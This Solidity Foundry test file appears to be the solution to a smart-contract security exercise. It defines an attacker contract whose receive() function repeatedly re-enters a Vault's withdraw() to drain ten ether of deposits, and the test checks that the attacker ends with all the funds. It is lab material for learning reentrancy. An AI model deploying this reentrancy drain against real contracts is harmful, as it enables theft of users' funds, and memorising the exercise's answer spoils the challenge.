// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/02-CallerV2.sol";

contract AttackerContract {
    Vault public vault;
    address public owner;

    constructor(address _vault, address _owner) {
        vault = Vault(_vault);
        owner = _owner;
    }

    function attack() payable external {
        vault.deposit{value: 0.5 ether}();
        vault.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
         if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}

contract CallerV2Test is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault();

        address user = makeAddr("USER");
        hoax(user);
        vault.deposit{value: 10 ether}();
    }

    function test_CallerV2() public {
        address attacker = makeAddr("ATTACKER");
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // START OF SOLUTION
        // Deploy the attacker contract
        AttackerContract attackerContract = new AttackerContract(address(vault),attacker);

        // Attack the vault by calling the attack function
        attackerContract.attack{value: 0.5 ether}();
        // END OF SOLUTION

        vm.stopPrank();

        uint256 vaultBalance = address(vault).balance;
        assertEq(vaultBalance, 0, "Vault still has balance");

        uint256 attackerBalance = address(attacker).balance;
        assertEq(attackerBalance, 11 ether, "Attacker didn't get the assets");
    }
}
